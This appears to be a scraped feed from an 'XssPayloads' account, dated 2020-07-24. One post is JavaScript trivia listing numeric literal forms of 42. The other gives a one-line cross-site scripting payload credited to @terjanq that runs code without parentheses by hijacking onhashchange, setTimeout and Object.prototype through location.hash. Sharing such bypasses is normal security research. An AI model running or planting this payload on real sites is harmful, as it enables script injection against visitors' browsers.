##User: XssPayloads	Time: 20200724
> 
``` Explanation of the last 4 here: https://twitter.com/aemkei/status/1286032641309933569 …```
  
  > 
``` Different ways to represent 42 in JS by @aemkei 
[
  42, 
  42.0,
  42e0, 
  4_2, // with numeric separator
  052, // octal 
  0o52, // octal
  0b101010, // binary
  0x2A, // hexadecimal
  42n // as BigInt
  4_2.0_0E0_0,
  0O5_2n,
  0B101_010n,
  0X2_an
]```
  
  > 
``` XSS without parenthesis by @terjanq 
onhashchange=setTimeout;Object.prototype.toString=RegExp.prototype.toString;Object.prototype.source=location.hash;location.hash=null
Explained here: https://twitter.com/terjanq/status/1286059148984147974 …```
  
  